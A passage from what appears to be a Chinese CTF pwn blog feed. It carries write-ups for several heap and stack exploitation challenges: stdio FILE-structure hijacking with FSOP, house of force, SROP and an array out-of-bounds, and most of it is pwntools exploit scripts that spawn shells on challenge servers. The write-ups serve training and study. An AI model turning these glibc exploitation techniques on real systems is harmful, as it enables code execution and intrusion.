<span class="string">&quot;s&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="incomplete-menu"><a class="markdownIt-Anchor" href="#incomplete-menu">#</a> Incomplete Menu</h1><h2 id="思路-2"><a class="markdownIt-Anchor" href="#思路-2">#</a> 思路</h2><p>这题给出了一个不完整的菜单，只有 <code>new</code>  和 <code>edit</code> ， <code>new</code>  就是新建一个 ** 任意大小（无限制）** 的堆块，最多只可以创建 <code>5</code>  个堆块， <code>edit</code>  可以输入需要读进某堆块中内容的长度 <code>len</code> ，如果输入的长度 <code>len</code>  超过了该堆块的大小 <code>size</code> ，则实际读入长度 <code>Len = size</code> ，否则 <code>Len = len</code> 。漏洞点在于：在将读入内容的最后一字节改为 <code>\x00</code>  的时候，长度用的是用户输入的长度 <code>len</code> ，而并非实际读入的长度 <code>Len</code> ，<strong>这样就会导致某堆块后面的任意某字节会被 “刷零”</strong>，不过每个堆块只能被 <code>edit</code>  一次。</p><p>没有 <code>show</code> ，不能泄露信息，不过有走 <code>IO</code>  流输出的函数，如 <code>puts</code>  和 <code>printf</code> ，因此容易想到通过劫持 <code>stdout</code>  来进行信息泄露，没有 <code>delete</code>  函数，不能对堆块进行 <code>free</code> ，其实可以通过漏洞改 <code>top chunk</code>  的 <code>size</code> ，将它改小以后（要保证后三位不动），再申请一个大堆块，就能将原先的 <code>top chunk</code>  给 <code>free</code>  调了，不过在这里貌似并没有太大的用处。</p><p>我们只有这一个可利用的漏洞，又需要劫持到 <code>stdout</code> ，那就需要知道 <code>stdout</code>  与堆块地址的偏移，对于一般的堆块，其地址与 <code>libc</code>  地址的偏移肯定是无法确定的，但是这题可以申请任意大的堆块，也就是可以通过 <code>mmap</code>  申请堆块，而 <code>**mmap**</code> <strong> 申请出来的堆块，是紧接在</strong> <code>**libc**</code> <strong> 的上方的，其地址与</strong> <code>**libc**</code> <strong> 中地址的偏移是可以确定的</strong>，这里可以通过<strong>将</strong> <code>**_IO_2_1_stdout_**</code> <strong> 的</strong> <code>**_IO_read_end**</code> <strong> 和</strong> <code>**_IO_write_base**</code> <strong> 的最后一字节都改为</strong> <code>**\x00**</code> <strong>，这样他们就相等了</strong>，也就可以通过走 <code>IO</code>  的输出函数泄露出其中（ <code>_IO_write_base ~ _IO_write_ptr</code> ）包含的 <code>libc</code>  地址，进而得到 <code>libc_base</code> 。</p><p>泄露出 <code>libc_base</code>  之后，我们肯定是需要一个 “任意写” 漏洞，劫持一些函数或者 <code>IO</code>  流这些才能完成攻击。不难想到，可以通过劫持 <code>stdin</code>  来实现，这里我们按照和上面类似的方式，<strong>修改</strong> <code>**_IO_2_1_stdin_**</code> <strong> 的</strong> <code>**_IO_buf_base**</code> <strong> 中的最后一字节为</strong> <code>**\x00**</code> ，这时， <code>_IO_buf_base</code>  正好指向了 <code>_IO_2_1_stdin_</code> ，而我们读入的时候，用的是 <code>fgets</code> ，这是一个走 <code>IO</code>  流的读入函数（这个函数就是读一整行到 <code>stdin</code>  缓冲区，然后再从缓冲区取出指定长度的数据，因此读数据会被 <code>\n</code>  截断，或者已经从缓冲区取到了所需长度的数据，也不再会刷新缓冲区往后读取数据了），因此，我们可以通过 <code>fgets</code>  读入任意内容到被伪造的 <code>_IO_buf_base</code> （ <code>_IO_2_1_stdin_</code> ）处，这样就可以再劫持一次 <code>stdin</code>  进行任意写了，我们读入多少字节到缓冲区， <code>_IO_read_end</code>  就会相应加多少，从缓冲区读取多少字节到目标内存， <code>_IO_read_ptr</code>  就会相应加多少，不过，最多也只能一次性读入 <code>_IO_buf_end - _IO_buf_base</code>  大小的数据到缓冲区，如果还需要读入，则会刷新缓冲区，一次也最多只能读取 <code>_IO_read_end - _IO_read_ptr</code>  大小的合法数据到目标内存，此时，由于 <code>_IO_buf_end</code>  为 <code>_IO_buf_base + 132</code> ，因此，<strong>我们只有读满</strong> <code>**132**</code> <strong> 个字节，才有机会按我们第一次劫持</strong> <code>**stdin**</code> <strong> 后，读入到</strong> <code>**_IO_buf_base**</code> <strong> 中的值（记为</strong> <code>**_IO_buf_base(new)**</code> <strong>）刷新缓冲区，只有刷新完缓冲区之后，才能按照我们的设想进行第二次</strong> <code>**stdin**</code> <strong> 的劫持</strong>。这里需要注意的是，在第一次完成 <code>stdin</code>  的劫持，读入 <code>132</code>  字节的内容到 <code>_IO_2_1_stdin_</code> 中之后，会尝试从缓冲区取 <code>16</code>  个字节到目标内存，如果成功取出了 <code>16</code>  个字节，也就满足了 <code>fgets</code>  的需要，那么也就不会刷新缓冲区了，我们也就不能对 <code>stdin</code>  进行第二次劫持了。在这里， <code>glibc</code>  是<strong>通过判断</strong> <code>**_IO_read_ptr**</code> <strong> 是否小于</strong> <code>**_IO_read_end**</code> <strong> 来判断缓冲区中是否还有剩余的数据</strong>，因此，我们可以在第一次劫持 <code>stdin</code>  往 <code>_IO_2_1_stdin_</code> 中写内容的时候，<strong>修改其中的</strong> <code>**_IO_read_ptr**</code> <strong> 等于</strong> <code>**_IO_read_end**</code> ，这里的 <code>_IO_read_end</code>  是指读完 <code>132</code>  个字节后的值（ <code>_IO_buf_base(new) + 132</code> ），也就是需要 <code>_IO_read_ptr = _IO_buf_base(new) + 132</code> ，其实，这里也不一定是要加上 <code>132</code> ，略小一点，只要保证和 <code>_IO_read_end</code>  差值不足大约 <code>16</code>  个字节，可以有刷新缓冲区的机会即可，并且， <code>glibc</code>  源码中也只是判断了 <code>_IO_read_ptr</code>  是否小于 <code>_IO_read_end</code> ，故还可以将 <code>_IO_read_ptr</code>  改为大于 <code>_IO_read_end</code> ，比如 <code>_IO_read_ptr = _IO_buf_base(new) + 200</code>  也行。在这里，我是通过<strong>劫持</strong> <code>**IO_list_all**</code> <strong> 来打</strong> <code>**FSOP**</code>  的，通过读取 <code>choice</code>  的 <code>fgets</code>  进行 “任意写” 以后，由于获取到的值并非菜单中的选项 <code>1</code>  或 <code>2</code> ，就会走到 <code>exit</code> ，直接触发 <code>FSOP</code> 。</p><h2 id="exp-2"><a class="markdownIt-Anchor" href="#exp-2">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28121</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_IO_str_jumps</span>():</span><br><span class="line">   IO_file_jumps_offset = libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">   IO_str_underflow_offset = libc.sym[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line">   <span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">       possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">       <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">          <span class="keyword">return</span> possible_IO_str_jumps_offset</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, length, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(length))</span><br><span class="line">    io.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_x</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_x</span>(<span class="params">index, length, content</span>):</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x200000</span>);</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x201000</span> - <span class="number">0x10</span> + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x10</span> + <span class="number">1</span>, <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">new_x(<span class="number">0x200000</span>);</span><br><span class="line">edit_x(<span class="number">1</span>, <span class="number">0x201000</span> * <span class="number">2</span> - <span class="number">0x10</span> + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x20</span> + <span class="number">1</span>, <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">libc_base = u64(io.recvline()[<span class="number">8</span>:<span class="number">16</span>]) - libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + <span class="number">0x38</span> <span class="comment"># _IO_stdfile_2_lock (_IO_2_1_stderr_.file._lock)</span></span><br><span class="line">success(<span class="string">&quot;libc_base:\t&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">5</span> + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(libc_base + get_IO_str_jumps() - <span class="number">8</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">new(<span class="number">0x200000</span>);</span><br><span class="line">edit(<span class="number">2</span>, <span class="number">0x201000</span> * <span class="number">3</span> - <span class="number">0x10</span> + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>] + <span class="number">0x38</span> + <span class="number">1</span>, payload) <span class="comment"># _IO_buf_base</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0xfbad208b</span>) <span class="comment"># _flags</span></span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>] + <span class="number">132</span>) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]) * <span class="number">6</span></span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>] + <span class="number">0x10</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">payload = payload.ljust(<span class="number">132</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(libc_base - (<span class="number">0x201000</span> * <span class="number">3</span> - <span class="number">0x10</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考"><a class="markdownIt-Anchor" href="#参考">#</a> 参考</h2><p><a href="https://qgieod1s9b.feishu.cn/docs/doccntELBOXQWXWrRgiWteZ0Xdh#">ctfshow 卷王杯官方 wp</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gyctf_2020_force</title>
      <link href="/2022/02/27/gyctf_2020_force/"/>
      <url>/2022/02/27/gyctf_2020_force/</url>
      
        <content type="html"><![CDATA[<p>house of force,realloc 调整栈帧</p><span id="more"></span><h1 id="思路"><a class="markdownIt-Anchor" href="#思路">#</a> 思路</h1><p>house of force 改 top chunk，劫持 malloc_hook 为 one_gadget 拿 shell</p><h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = remote(&quot;node4.buuoj.cn&quot;, 26964)</span></span><br><span class="line">r = process(<span class="string">&quot;./gyctf_2020_force&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./gyctf_2020_force&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget_16 = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">r.recvuntil(<span class="string">&quot;2:puts\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;size\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">r.recvuntil(<span class="string">&quot;bin addr &quot;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip(), <span class="number">16</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;content\n&quot;</span>)</span><br><span class="line">r.send(content)</span><br><span class="line"><span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">r.recvuntil(<span class="string">&quot;2:puts\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.address = add(<span class="number">0x200000</span>, <span class="string">&#x27;chunk0\n&#x27;</span>) + <span class="number">0x200ff0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base&#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">heap_addr = add(<span class="number">0x18</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>))</span><br><span class="line">success(<span class="string">&quot;heap_addr:&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">top = heap_addr + <span class="number">0x10</span></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;malloc_hook&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">one_gadget = one_gadget_16[<span class="number">1</span>] + libc.address</span><br><span class="line">realloc = libc.sym[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line">offset = malloc_hook - top</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">success(<span class="string">&quot;system:&quot;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line">success(<span class="string">&quot;bin_sh&quot;</span> + <span class="built_in">hex</span>(bin_sh))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(offset-<span class="number">0x30</span>, <span class="string">&#x27;aaa\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(one_gadget)+p64(realloc+<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;2:puts\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;size\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF Pwn Exercise(一)</title>
      <link href="/2022/02/18/BUUCTF%20Pwn%20Exercise/"/>
      <url>/2022/02/18/BUUCTF%20Pwn%20Exercise/</url>
      
        <content type="html"><![CDATA[<p>BUUOJ PWN EXERCISE</p><span id="more"></span><h1 id="rootersctf_2019_sropsrop"><a class="markdownIt-Anchor" href="#rootersctf_2019_sropsrop">#</a> rootersctf_2019_srop(srop)</h1><h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;rootersctf_2019_srop&quot;</span>)</span><br><span class="line">context.update(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, endian=<span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write /bin/sh on 0x402000</span></span><br><span class="line">data_addr = <span class="number">0x402000</span></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line">syscall_addr = <span class="number">0x401046</span></span><br><span class="line">frame = SigreturnFrame(kernel=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">frame.rax = <span class="number">0</span> <span class="comment"># read </span></span><br><span class="line">frame.rdi = <span class="number">0</span> <span class="comment"># stdin</span></span><br><span class="line">frame.rsi = data_addr</span><br><span class="line">frame.rdx = <span class="number">0x400</span></span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line">frame.rbp = data_addr + <span class="number">0x20</span></span><br><span class="line">layout = [<span class="number">0x88</span> * <span class="string">&quot;a&quot;</span>, pop_rax_syscall_leave_ret, <span class="number">0xf</span>, <span class="built_in">bytes</span>(frame)]</span><br><span class="line"><span class="comment"># srop to call read, set *data_addr = /bin/sh\x00</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Hey, can i get some feedback for the CTF?\n&quot;</span>, flat(layout))</span><br><span class="line"></span><br><span class="line"><span class="comment"># call execve /bin/sh</span></span><br><span class="line">layout = [<span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x20</span>, pop_rax_syscall_leave_ret, <span class="number">0xf</span>]</span><br><span class="line">frame = SigreturnFrame(kernel=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">frame.rax = <span class="number">59</span> <span class="comment"># execve </span></span><br><span class="line">frame.rdi = data_addr <span class="comment"># stdin</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">layout.append(<span class="built_in">bytes</span>(frame))</span><br><span class="line">sh.sendline(flat(layout))</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章">#</a> 参考文章</h2><p><a href="https://blog.csdn.net/weixin_46521144/article/details/120714498">https://blog.csdn.net/weixin_46521144/article/details/120714498</a></p><p><a href="https://www.cnblogs.com/LynneHuan/p/14723605.html#exp">https://www.cnblogs.com/LynneHuan/p/14723605.html#exp</a></p><h1 id="qctf_2018_stack2数组越界"><a class="markdownIt-Anchor" href="#qctf_2018_stack2数组越界">#</a> qctf_2018_stack2（数组越界）</h1><h2 id="exp-2"><a class="markdownIt-Anchor" href="#exp-2">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python                         </span></span><br><span class="line"><span class="comment"># coding=utf-8                                </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                             </span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)                  </span><br><span class="line">                                              </span><br><span class="line">sh = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;28924&quot;</span>)         </span><br><span class="line">                                              </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;have:\n&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)               </span><br><span class="line">                                              </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;5. exit\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)             </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;change:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">116</span> + <span class="number">0x10</span>))   </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;number:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x9b</span>))       </span><br><span class="line">                                              </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;5. exit\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)             </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;change:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">117</span> + <span class="number">0x10</span>))   </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;number:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x85</span>))       </span><br><span class="line">                                              </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;5. exit\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)             </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;change:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">118</span> + <span class="number">0x10</span>))   </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;number:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x04</span>))       </span><br><span class="line">                                              </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;5. exit\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)             </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;change:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">119</span> + <span class="number">0x10</span>))   </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;number:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x08</span>))       </span><br><span class="line">                                              </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;5. exit\n&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)             </span><br><span class="line">sh.interactive()                                </span><br></pre></td></tr></table></figure><h1 id="hfctf_2020_marksmanexit_hook"><a class="markdownIt-Anchor" href="#hfctf_2020_marksmanexit_hook">#</a> hfctf_2020_marksman(exit_hook)</h1><h2 id="exp-3"><a class="markdownIt-Anchor" href="#exp-3">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line">LOG_ADDR = <span class="keyword">lambda</span> x, y: log.success(<span class="string">&#x27;&#123;&#125; ===&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(x, <span class="built_in">hex</span>(y)))</span><br><span class="line">int16 = functools.partial(<span class="built_in">int</span>, base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&quot;./hfctf_2020_marksman&quot;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27982</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;I placed the target near: &quot;</span>)</span><br><span class="line">msg = sh.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = int16(msg[:-<span class="number">1</span>].decode())</span><br><span class="line">LOG_ADDR(<span class="string">&quot;puts_addr&quot;</span>, puts_addr)</span><br><span 